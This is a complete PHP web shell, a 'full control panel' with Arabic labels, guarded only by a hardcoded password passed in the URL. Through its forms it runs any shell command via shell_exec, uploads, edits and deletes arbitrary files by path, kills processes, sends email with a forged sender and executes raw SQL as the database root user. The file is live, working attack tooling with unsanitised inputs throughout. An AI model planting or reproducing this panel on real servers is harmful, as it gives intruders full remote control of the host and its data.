<?php
session_start();

// 🔹 إعدادات الحماية 🔹
$password = "admin123"; // غير كلمة المرور!
$session_timeout = 3600; // مدة الجلسة (1 ساعة)

// التحقق من كلمة المرور
if (isset($_GET['pass']) && $_GET['pass'] === $password) {
    $_SESSION['authenticated'] = true;
    $_SESSION['start_time'] = time();
}

// تسجيل الخروج
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: full_control.php");
    exit();
}

// إنهاء الجلسة بعد المهلة
if (isset($_SESSION['start_time']) && (time() - $_SESSION['start_time'] > $session_timeout)) {
    session_destroy();
    header("Location: full_control.php");
    exit();
}

// التحقق من المصادقة
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    die("<form method='GET'><input type='password' name='pass' placeholder='أدخل كلمة المرور'><input type='submit' value='دخول'></form>");
}

// 🟢 الواجهة الرئيسية
echo "<h2>لوحة التحكم الكاملة</h2>";
echo "<a href='full_control.php?logout=true'>تسجيل الخروج</a> | <a href='full_control.php'>تحديث الصفحة</a><br><hr>";

// 🔹 تنفيذ أوامر النظام
if (isset($_POST['cmd'])) {
    echo "<h3>نتائج تنفيذ الأمر:</h3><pre>" . shell_exec($_POST['cmd']) . "</pre>";
}

// 🔹 إدارة الملفات
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], __DIR__ . "/" . $_FILES['file']['name']);
    echo "✅ تم رفع الملف: " . $_FILES['file']['name'] . "<br>";
}

// 🔹 حذف الملفات
if (isset($_GET['delete'])) {
    unlink($_GET['delete']);
    header("Location: full_control.php");
    exit();
}

// 🔹 تعديل الملفات
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        file_put_contents($file, $_POST['content']);
        echo "✅ تم حفظ التعديلات!";
    }
    $content = file_get_contents($file);
    echo "<h3>تحرير ملف: $file</h3>";
    echo "<form method='POST'><textarea name='content' rows='10' cols='100'>$content</textarea><br><input type='submit' value='حفظ'></form>";
    exit();
}

// 🔹 عرض الملفات
echo "<h3>إدارة الملفات</h3>";
$files = scandir(__DIR__);
echo "<ul>";
foreach ($files as $file) {
    if ($file !== "." && $file !== "..") {
        echo "<li><a href='$file'>$file</a> | 
        <a href='?edit=$file' style='color:blue;'>تحرير</a> | 
        <a href='?delete=$file' style='color:red;'>حذف</a></li>";
    }
}
echo "</ul>";

// 🔹 إدارة العمليات
if (isset($_POST['kill_pid'])) {
    shell_exec("kill -9 " . intval($_POST['kill_pid']));
    echo "✅ تم إنهاء العملية!";
}

// 🔹 إرسال البريد باستخدام SMTP
if (isset($_POST['send_email'])) {
    $to = $_POST['to'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];
    $headers = "From: admin@example.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "✅ تم إرسال البريد بنجاح!";
    } else {
        echo "❌ فشل إرسال البريد!";
    }
}

// 🔹 استعلامات قاعدة البيانات
if (isset($_POST['sql_query'])) {
    $conn = new mysqli("localhost", "root", "", "your_database_name");
    if ($conn->connect_error) {
        die("❌ فشل الاتصال بقاعدة البيانات: " . $conn->connect_error);
    }
    $result = $conn->query($_POST['sql_query']);
    if ($result) {
        echo "<h3>✅ استعلام ناجح</h3>";
        if ($result instanceof mysqli_result) {
            echo "<table border='1'><tr>";
            while ($field = $result->fetch_field()) {
                echo "<th>" . $field->name . "</th>";
            }
            echo "</tr>";
            while ($row = $result->fetch_assoc()) {
                echo "<tr>";
                foreach ($row as $col) {
                    echo "<td>" . htmlspecialchars($col) . "</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
        }
    } else {
        echo "❌ خطأ في الاستعلام: " . $conn->error;
    }
}

// 🟢 **النماذج والإدخالات**
?>

<h3>تنفيذ الأوامر</h3>
<form method="POST">
    <input type="text" name="cmd" placeholder="أدخل الأمر">
    <input type="submit" value="تنفيذ">
</form>

<h3>رفع الملفات</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="رفع">
</form>

<h3>إدارة العمليات</h3>
<form method="POST">
    <input type="number" name="kill_pid" placeholder="PID (رقم العملية)">
    <input type="submit" value="إنهاء العملية">
</form>

<h3>إرسال بريد عبر SMTP</h3>
<form method="POST">
    <input type="email" name="to" placeholder="البريد الإلكتروني">
    <input type="text" name="subject" placeholder="الموضوع">
    <textarea name="message" placeholder="الرسالة"></textarea>
    <input type="hidden" name="send_email" value="1">
    <input type="submit" value="إرسال">
</form>

<h3>تنفيذ استعلام SQL</h3>
<form method="POST">
    <textarea name="sql_query" placeholder="أدخل استعلام SQL"></textarea>
    <input type="submit" value="تنفيذ">
</form>
